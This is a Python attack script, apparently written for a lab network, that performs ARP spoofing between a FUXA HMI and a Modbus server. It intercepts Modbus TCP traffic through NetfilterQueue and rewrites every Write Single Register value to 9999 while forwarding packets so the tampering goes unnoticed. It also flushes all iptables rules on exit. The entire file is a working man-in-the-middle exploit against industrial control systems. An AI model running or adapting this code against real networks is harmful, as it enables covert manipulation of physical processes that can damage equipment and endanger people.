#!/usr/bin/env python3
import sys
import time
import os
import threading
from scapy.all import Ether, ARP, IP, TCP, Raw, sendp
from netfilterqueue import NetfilterQueue

def enable_ip_forwarding():
    """Enables IP forwarding on Linux so n1 routes packets instead of dropping them."""
    if os.name == 'posix':
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print("[+] IP forwarding enabled successfully.")
        except PermissionError:
            print("[-] Error: Root privileges required to enable IP forwarding. Run with sudo.")
            sys.exit(1)

def spoof(target_ip, spoof_ip, target_mac):
    """Sends a forged ARP reply wrapped explicitly in an Ethernet frame."""
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """Restores the original ARP table state on exit."""
    print(f"\n[-] Restoring ARP table for {destination_ip}...")
    packet = Ether(dst=destination_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, verbose=False)

def spoof_loop(target_ip_1, target_ip_2, target_mac_1, target_mac_2):
    """Continuously runs the ARP poisoning loop in a background thread."""
    def poison():
        while True:
            # Poison TSServer to think n1 is FUXA
            spoof(target_ip_2, target_ip_1, target_mac_2)
            # Poison FUXA to think n1 is TSServer
            spoof(target_ip_1, target_ip_2, target_mac_1)
            time.sleep(2)

    thread = threading.Thread(target=poison, daemon=True)
    thread.start()
    print("[+] ARP spoofing background loop started.")

def modify_modbus_packet(nfpacket):
    """Safely reconstructs, modifies, and re-injects Modbus TCP packets via NFQueue."""
    try:
        # Get raw packet bytes from NetfilterQueue
        raw_data = nfpacket.get_payload()
        
        # Reconstruct a fresh Scapy IP packet from bytes
        packet = IP(raw_data)
        print("[DEBUG] Packet intercepted by NFQueue!") # Add this line

        if packet.haslayer(TCP) and packet.haslayer(Raw):
            tcp_layer = packet[TCP]
            ip_layer = packet[IP]
            
            # Modbus TCP standard port is 502
            if tcp_layer.dport == 502 or tcp_layer.sport == 502:
                payload = bytes(packet[Raw].load)
                
                # MBAP header (7 bytes) + Function Code (1 byte) + Data (at least 4 bytes)
                if len(payload) >= 12:
                    function_code = payload[7]
                    
                    # Function Code 6 = Write Single Register
                    if function_code == 6:
                        original_value = int.from_bytes(payload[10:12], byteorder='big')
                        print(f"\n[DPI Intercept] Modbus Write Single Register (FC 6) detected!")
                        print(f"Source: {ip_layer.src} -> Destination: {ip_layer.dst}")
                        print(f"[-] Original Written Value: {original_value}")
                        
                        # 9999 in big-endian 2-byte hexadecimal representation
                        forged_value_bytes = (9999).to_bytes(2, byteorder='big')
                        
                        # Reconstruct payload with the modified value bytes (Bytes 10-11)
                        modified_payload = payload[:10] + forged_value_bytes + payload[12:]
                        packet[Raw].load = modified_payload
                        
                        # Clear checksums and length so Scapy recalculates them cleanly
                        del packet[IP].len
                        del packet[IP].chksum
                        del packet[TCP].chksum
                        
                        # Re-inject modified packet bytes back into the queue
                        nfpacket.set_payload(bytes(packet))
                        print(f"[+] Successfully modified register value to: 9999 (Hex: {forged_value_bytes.hex()})")
        
        # Accept the packet (modified or untouched) so it continues to its destination
        nfpacket.accept()
        
    except Exception as e:
        print(f"[-] Error processing packet: {e}")
        nfpacket.accept()

if __name__ == "__main__":
    # Ensure script is run with proper privileges
    if os.geteuid() != 0:
        print("[-] This script requires root/administrator privileges (run with sudo).")
        sys.exit(1)

    # Enable routing so traffic flows through n1 seamlessly
    enable_ip_forwarding()

    # Define endpoints (Modify these to match your network environment)
    target_ip_1 = "172.21.0.5"            # e.g., FUXA HMI IP
    target_mac_1 = "AA:BB:CC:DD:EE:FF"    # FUXA MAC Address
    
    target_ip_2 = "172.21.0.3"      # e.g., TSServer IP
    target_mac_2 = "11:22:33:44:55:66"    # TSServer MAC Address

    # Start background ARP poisoning loop
    spoof_loop(target_ip_1, target_ip_2, target_mac_1, target_mac_2)

    # Set up iptables rules to divert port 502 traffic into Queue 1
    os.system("iptables -I FORWARD -p tcp --dport 502 -j NFQUEUE --queue-num 1")
    os.system("iptables -I FORWARD -p tcp --sport 502 -j NFQUEUE --queue-num 1")

    print(f"[*] Starting NetfilterQueue DPI inspection between {target_ip_1} and {target_ip_2}...")
    print("[*] Press Ctrl+C to stop and restore network tables.")
    
    nfqueue = NetfilterQueue()
    try:
        nfqueue.bind(1, modify_modbus_packet)
        nfqueue.run()
    except KeyboardInterrupt:
        # Clean up iptables and gracefully restore normal network behavior
        print("\n[-] Cleaning up iptables rules...")
        os.system("iptables --flush")
        restore(target_ip_1, target_ip_2, target_mac_1, target_mac_2)
        restore(target_ip_2, target_ip_1, target_mac_2, target_mac_1)
        print("[*] Network restored. Exiting.")